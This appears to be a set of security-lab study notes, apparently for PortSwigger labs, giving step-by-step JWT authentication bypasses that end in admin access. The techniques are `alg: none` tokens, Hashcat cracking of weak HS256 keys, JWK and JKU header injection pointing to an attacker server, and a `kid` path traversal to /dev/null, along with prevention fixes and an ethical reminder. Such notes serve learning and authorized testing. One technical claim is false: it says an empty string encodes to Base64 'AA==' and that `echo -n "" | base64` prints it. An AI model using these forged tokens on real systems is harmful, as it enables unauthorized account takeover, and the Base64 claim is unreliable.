# 🔐 JWT Authentication Bypass - Complete Notes

## ⚠️ CRITICAL NOTE - Admin Panel Access

**🎯 IMPORTANT:** For admin panel access, always change the URL from:

```
❌ /myaccount?username=<name>
✅ /admin
```

**Otherwise it will NOT work!**

---

## 📑 Table of Contents

1. JWT Authentication Bypass via Unverified Signature
2. JWT Authentication Bypass via Flawed Signature Verification
3. JWT Authentication Bypass via Weak Signing Key
4. JWT Authentication Bypass via JWK Header Injection
5. JWT Authentication Bypass via JKU Header Injection
6. JWT Authentication Bypass via KID Header Path Traversal

---

## 📚 JWT Structure Overview

```
JWT Token = Header.Payload.Signature

🔸 Header:    {"alg": "HS256", "typ": "JWT"}
🔸 Payload:   {"sub": "user123", "name": "John", "admin": false}
🔸 Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)
```

---

## 1️⃣ JWT Authentication Bypass via Unverified Signature

### 📌 Concept

Website does **NOT** check the JWT signature strictly. You can modify the payload (username, roles, etc.) without invalidating the token.

### 🔍 Why This Works

- Server accepts JWT tokens without verifying signature
- Only decodes and reads the payload data
- No cryptographic validation performed

### 🛠️ Testing Steps

**Step 1:** Send request to Burp Repeater

```
🔸 Intercept the request containing JWT token
🔸 Right-click → Send to Repeater
```

**Step 2:** Edit the JWT payload

```json
Original Payload:
{
  "sub": "wiener",
  "name": "Peter Wiener",
  "admin": false
}

Modified Payload:
{
  "sub": "administrator",
  "name": "Administrator",
  "admin": true
}
```

**Step 3:** Send the modified request

```
✅ Hit "Send" button
💥 Access granted as administrator!
```

### 💡 Key Points

- ⚠️ No signature verification needed
- 🎯 Simply change username to `administrator`
- 🔓 Instant admin access

---

## 2️⃣ JWT Authentication Bypass via Flawed Signature Verification

### 📌 Concept

Change the algorithm to **`none`** so the server skips signature verification entirely. This exploits weak algorithm validation.

### 🔍 Why This Works

- Server accepts `alg: none` algorithm
- When algorithm is "none", no signature is required
- Server doesn't enforce algorithm restrictions

### 🛠️ Testing Steps

**Step 1:** Send request to Repeater

```
🔸 Intercept JWT request
🔸 Send to Repeater
```

**Step 2:** Modify JWT Header

```json
Original Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Modified Header:
{
  "alg": "none",
  "typ": "JWT"
}
```

**Step 3:** Modify Payload (if needed)

```json
{
  "sub": "administrator",
  "name": "Administrator"
}
```

**Step 4:** Remove signature

```
Original: eyJhbGc...header.eyJzdWI...payload.signature_here
Modified: eyJhbGc...header.eyJzdWI...payload.
                                              ↑ (remove signature, keep the dot)
```

**Step 5:** Send request

```
✅ Hit "Send"
💥 Bypassed authentication!
```

### 💡 Key Points

- 🔸 Algorithm changed to `none`
- 🔸 Signature part can be empty
- ⚠️ Keep the trailing dot (.)

---

## 3️⃣ JWT Authentication Bypass via Weak Signing Key

### 📌 Concept

If website uses **symmetric cryptography** (like HS256) with a weak secret key, we can brute-force it using **Hashcat** and forge valid tokens.

### 🔍 Why This Works

- Weak passwords used as signing keys
- HS256 uses same key for signing & verification
- Dictionary/brute-force attacks can crack weak keys

### 🛠️ Testing Steps

**Step 1:** Send request to Repeater

```
🔸 Capture request with JWT token
🔸 Copy the complete JWT token
```

**Step 2:** Brute-force with Hashcat

```bash
# Command structure
hashcat -a 0 -m 16500 "<jwt_token>" /path/to/wordlist.txt

# Example
hashcat -a 0 -m 16500 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIifQ.signature" rockyou.txt
```

**🔸 Parameters Explained:**

- `-a 0` → Dictionary attack mode
- `-m 16500` → JWT (HS256) hash mode
- `<jwt_token>` → Your captured JWT
- `wordlist.txt` → Password dictionary file

**Step 3:** Extract the cracked key

```bash
# Hashcat output example:
eyJhbGc...token...:secret123

🎯 Found key: secret123
```

**Step 4:** Encode key in Base64

```
🔸 Go to Burp → Decoder tab
🔸 Enter: secret123
🔸 Encode as: Base64
🔸 Result: c2VjcmV0MTIz
📋 Copy this encoded value
```

**Step 5:** Create new Symmetric Key in JWT Editor

```
🔸 Burp → JWT Editor Keys tab
🔸 Click "New Symmetric Key"
🔸 Replace the "k" parameter value with encoded key: c2VjcmV0MTIz
🔸 Click "Generate"
```

**Step 6:** Modify and Sign JWT

```
🔸 Go to request in Repeater
🔸 Modify payload (change username to "administrator")
🔸 Go to "JSON Web Token" tab at bottom
🔸 Click "Sign" button
🔸 Select: "Don't modify header"
🔸 Click "OK"
```

**Step 7:** Send request

```
✅ Hit "Send"
💥 Boom! Admin panel access granted!
```

### 💡 Key Points

- 🔐 Only works with symmetric algorithms (HS256, HS384, HS512)
- 🔑 Requires weak/common passwords
- ⚡ Hashcat is fastest for cracking
- 📝 Always Base64 encode the secret before using

---

## 4️⃣ JWT Authentication Bypass via JWK Header Injection

### 📌 Concept

Exploit **asymmetric cryptography** (RS256) by injecting our own **JWK (JSON Web Key)** in the header. Server uses embedded key instead of its own.

### 🔍 Why This Works

- Server accepts JWK from token header
- Uses embedded public key for verification
- No validation of key origin

### 🛠️ Testing Steps

**Step 1:** Modify username in payload

```json
{
  "sub": "administrator",
  "name": "Administrator"
}
```

**Step 2:** Generate RSA Key Pair

```
🔸 Burp → JWT Editor Keys tab
🔸 Click "New RSA Key"
🔸 Key Size: 2048 bits
🔸 Click "Generate"
🔸 Save the key
```

**Step 3:** Attack with Embedded JWK

```
🔸 Go to request in Repeater
🔸 Go to "JSON Web Token" tab
🔸 Click "Attack" dropdown
🔸 Select "Embedded JWK"
🔸 Select your generated RSA key
🔸 Click "OK"
```

**Step 4:** Send request

```
✅ Hit "Send"
💥 Admin panel unlocked!
```

### 💡 What Happens Behind the Scenes

```json
Header before attack:
{
  "alg": "RS256",
  "typ": "JWT"
}

Header after attack:
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "your-key-id",
    "n": "your-public-key-modulus..."
  }
}
```

### 💡 Key Points

- 🔐 Works with asymmetric algorithms (RS256, RS384, RS512)
- 🔑 We control both private & public key
- 🎯 Server trusts embedded JWK without validation

---

## 5️⃣ JWT Authentication Bypass via JKU Header Injection

### 📌 Concept

Inject **JKU (JSON Web Key URL)** header pointing to attacker-controlled server hosting malicious public keys.

### 🔍 Why This Works

- Server fetches public keys from JKU URL
- No validation of URL origin
- Attacker can host their own key set

### 🛠️ Testing Steps

**Step 1:** Create new RSA Key

```
🔸 Burp → JWT Editor Keys tab
🔸 Click "New RSA Key"
🔸 Generate key
🔸 Copy the public key (JWK format)
```

**Step 2:** Setup Exploit Server

```
🔸 Go to Exploit Server
🔸 In Body section, add:
```

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "your-generated-kid",
      "n": "your-public-key-modulus..."
    }
  ]
}
```

```
🔸 Save and note the URL
```

**Step 3:** Modify JWT Token

```
🔸 Go to Repeater
🔸 Modify payload (username → administrator)
🔸 In JSON Web Token tab, modify header:
```

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "your-generated-kid",
  "jku": "https://exploit-server.com/exploit"
}
```

**Step 4:** Sign the token

```
🔸 Click "Sign" button
🔸 Select your RSA key
🔸 Don't modify header
🔸 Click "OK"
```

**Step 5:** Send request

```
✅ Hit "Send"
💥 Boom! Admin panel access!
```

### 💡 Key Points

- 🌐 JKU = URL pointing to JSON Web Key Set
- 🔑 Server fetches keys from attacker's URL
- 🎯 Kid parameter links token to specific key

---

## 6️⃣ JWT Authentication Bypass via KID Header Path Traversal

### 📌 Concept

Exploit **path traversal** in `kid` (Key ID) parameter to point to predictable file (like `/dev/null`) and use empty string as signing key.

### 🔍 Why This Works

- Kid parameter vulnerable to directory traversal
- `/dev/null` is an empty file on Linux
- Empty string can be used as symmetric key
- Only works with **symmetric algorithms**

### 🛠️ Testing Steps

**Step 1:** Modify JWT Header

```json
Original:
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "some-key-id"
}

Modified:
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../../dev/null"
}
```

**Step 2:** Modify Payload

```json
{
  "sub": "administrator",
  "name": "Administrator"
}
```

**Step 3:** Create Symmetric Key with empty secret

```
🔸 Burp → JWT Editor Keys tab
🔸 Click "New Symmetric Key"
🔸 Find the "k" parameter
🔸 Replace value with: AA==
   (This is Base64 of empty string/null byte)
🔸 Save the key
```

**Step 4:** Sign the token

```
🔸 Go to JSON Web Token tab
🔸 Click "Sign"
🔸 Select your symmetric key (with AA==)
🔸 Don't modify header
🔸 Click "OK"
```

**Step 5:** Send request

```
✅ Hit "Send"
💥 Boom! Admin panel granted!
```

### 💡 Path Traversal Alternatives

```
Try these kid values:
🔸 ../../../../../../../dev/null
🔸 ../../../../../../dev/null
🔸 /dev/null
🔸 ../../../../etc/passwd (if you know key location)
```

### 💡 Key Points

- 🔓 Only works with symmetric algorithms (HS256)
- 📁 Exploits file system access
- 🔑 Empty string (AA==) is Base64 of null byte
- ⚠️ Number of `../` may vary based on directory depth

---

## 🔐 JWT Algorithms Comparison

|Algorithm|Type|Key Type|Attack Vector|
|---|---|---|---|
|**HS256**|Symmetric|Single Secret|Weak key brute-force, KID traversal|
|**RS256**|Asymmetric|Public/Private|JWK injection, JKU injection|
|**none**|None|No key|Algorithm confusion|

---

## 🛡️ Prevention Measures

|❌ Vulnerability|✅ Fix|
|---|---|
|Unverified signature|Always verify JWT signature|
|Algorithm confusion|Reject `alg: none`, whitelist allowed algorithms|
|Weak signing key|Use strong, random keys (256+ bits)|
|JWK injection|Never trust embedded JWK from token|
|JKU injection|Whitelist trusted JKU domains only|
|KID traversal|Validate & sanitize KID parameter, no file system access|

---

## 🔧 Essential Tools

**🦊 Burp Suite Extensions:**

- JWT Editor
- JSON Web Tokens
- JWT Attacker

**⚡ Command Line Tools:**

- Hashcat (key cracking)
- jwt_tool (Python)
- John the Ripper

**📝 Online Resources:**

- jwt.io (decode/verify tokens)
- Base64 encoder/decoder

---

## 📚 Quick Reference Commands

### Hashcat JWT Cracking

```bash
# Basic syntax
hashcat -a 0 -m 16500 "<jwt_token>" wordlist.txt

# With rules
hashcat -a 0 -m 16500 "<jwt_token>" wordlist.txt -r rules/best64.rule

# Resume session
hashcat --session jwt_crack --restore
```

### Base64 Encoding (Linux/Mac)

```bash
# Encode
echo -n "secret123" | base64

# Decode
echo "c2VjcmV0MTIz" | base64 -d

# Empty string (null byte)
echo -n "" | base64
# Output: AA==
```

### cURL JWT Request

```bash
curl -H "Authorization: Bearer <jwt_token>" https://target.com/admin
```

---

## 🎯 Testing Checklist

- [ ] Check if signature is verified
- [ ] Test `alg: none` bypass
- [ ] Attempt weak key brute-force (if HS256)
- [ ] Try JWK header injection (if RS256)
- [ ] Test JKU header injection
- [ ] Check KID parameter for path traversal
- [ ] Modify payload claims (username, roles, admin)
- [ ] Test with different algorithms
- [ ] Check token expiration enforcement
- [ ] Verify audience (aud) claim validation

---

## ⚠️ Ethical Reminder

**🚨 IMPORTANT:** Only test on authorized systems!

- ✅ Use on CTF challenges (HackTheBox, PortSwigger Labs)
- ✅ Test on your own applications
- ✅ Conduct authorized penetration tests
- ❌ **NEVER** test on systems without permission
- ❌ Unauthorized testing is **illegal**

**📜 Always get written authorization before testing!**

---

## 💡 Pro Tips

1. **🔍 Always decode JWT first** - Use jwt.io to understand structure
2. **📋 Copy tokens carefully** - Include entire token with all dots
3. **🎯 Check algorithm** - Different attacks for symmetric vs asymmetric
4. **⚡ Use Burp extensions** - JWT Editor makes attacks easier
5. **🔑 Save cracked keys** - Build a database of common secrets
6. **🧪 Test systematically** - Follow checklist order
7. **📝 Document findings** - Screenshot each successful step

---

## 🔗 Additional Resources

**📚 Learning Platforms:**

- PortSwigger Web Security Academy (JWT Labs)
- HackTheBox (JWT Challenges)
- TryHackMe (JWT Rooms)

**📖 Documentation:**

- RFC 7519 - JSON Web Token (JWT)
- OWASP JWT Cheat Sheet
- Auth0 JWT Handbook

---

**📝 Created for Security Testing & Learning**  
**🗓️ Last Updated: 2025**

---

**💬 Happy Hacking! (Ethically) 🔐**